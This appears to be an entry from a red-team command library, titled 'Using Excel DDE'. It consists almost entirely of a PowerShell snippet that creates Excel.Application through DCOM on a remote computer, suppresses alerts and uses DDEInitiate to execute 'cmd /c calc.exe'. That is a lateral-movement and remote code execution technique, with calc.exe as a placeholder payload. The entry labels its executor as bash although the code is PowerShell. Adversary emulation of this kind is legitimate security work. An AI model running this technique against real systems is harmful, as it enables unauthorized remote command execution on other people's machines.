---
id: 62e0b1ca-4a94-4e68-92dc-a379956008ec
name: Using Excel DDE
type: command
executor: bash
data: '$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",
  \"$ComputerName\"))

  $excel.DisplayAlerts = $false

  $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")'
output: null
created_at: '2023-04-06T03:56:07.120680+00:00'
updated_at: '2023-04-10T20:26:32.005120+00:00'
---

# Using Excel DDE

```bash
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate(\"cmd\", \"/c calc.exe\")
```


